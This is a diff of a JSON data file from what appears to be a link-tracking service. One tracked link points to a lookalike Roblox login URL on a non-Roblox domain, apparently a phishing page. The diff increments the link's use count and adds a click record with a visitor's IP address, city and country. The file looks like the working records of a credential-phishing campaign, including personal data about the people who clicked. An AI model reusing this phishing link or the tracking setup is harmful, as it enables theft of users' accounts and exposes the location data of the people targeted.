@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1635,
+    "useCount": 1636,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13248,6 +13248,14 @@
         "city": "Singapore",
         "flag": "🇸🇬",
         "countryCode": "SG"
+      },
+      {
+        "timestamp": 1777557897624,
+        "ip": "171.234.8.45",
+        "country": "Vietnam",
+        "city": "Buon Ma Thuot",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
